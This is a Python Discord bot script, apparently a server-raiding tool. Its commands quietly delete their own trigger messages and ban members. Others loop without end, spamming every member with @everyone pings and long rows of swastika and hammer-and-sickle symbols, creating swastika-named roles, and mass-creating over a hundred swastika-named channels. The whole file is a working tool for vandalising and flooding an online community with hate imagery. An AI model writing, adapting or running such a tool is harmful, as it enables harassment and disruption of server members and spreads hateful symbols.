import discord
from discord.ext.commands import *
from discord.ext import commands
import random
import asyncio
import time
import json
from itertools import cycle
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get
 
  
bot = commands.Bot(command_prefix='.')
 
client = commands.Bot(command_prefix='.')
 

bot.remove_command('help')
 
 
 
##BOT IS READY##
@bot.event
async def on_ready():
#BOT STATUS#
    print("t'es prêt pour faire du sale ? ")
    print("Ok gros chu co !")
 
 
 
##BAN COMMAND##
@bot.command(pass_context=True)
async def ban(ctx, member : discord.Member):
    await member.ban()
    await ctx.message.delete()
 
 
##SPAM COMMAND##
@bot.command(pass_context=True)
async def spam(ctx):
    await ctx.message.delete()
    while True:
        await ctx.send("卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 @everyone")
        await ctx.send("卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 @everyone")
        await ctx.send("卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 @everyone")
        await ctx.send("卐卐卐卐卐卐卐卐卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 @everyone")
        await ctx.send("卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 @everyone")
        await ctx.send("卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐☭☭☭卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐 @everyone")
        await ctx.send("卐卐卐卐卐卐卐卐卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 @everyone")
        await ctx.send("卐卐卐卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 @everyone")
        await ctx.send("卐卐卐卐卐卐卐卐卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 @everyone")
        await ctx.send("卐卐卐卐卐卐卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 @everyone")
        await ctx.send("卐☭☭☭卐卐☭☭☭卐卐☭☭☭卐卐☭☭☭卐 @everyone")
        await ctx.send("卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 @everyone")
        await ctx.send("卐卐卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 @everyone")
        await ctx.send("卐卐卐卐卐卐卐卐卐卐卐卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 @everyone")
        await ctx.send("卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 @everyone")
        await ctx.send("卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐☭☭☭卐卐卐☭☭☭卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐 @everyone")
        
       
##SPAM ROLE##
@bot.command(pass_context=True)
async def roles(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="卐卐")
 
 
 
##MAKE CHANNELS##
@bot.command(pass_context=True)
async def channels(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    await guild.create_text_channel('卐卐卐') 
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐 > ALL')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
    await guild.create_text_channel('卐卐卐')
 
 
 
 
##BOT TOKEN##
bot.run ("TOKEN")
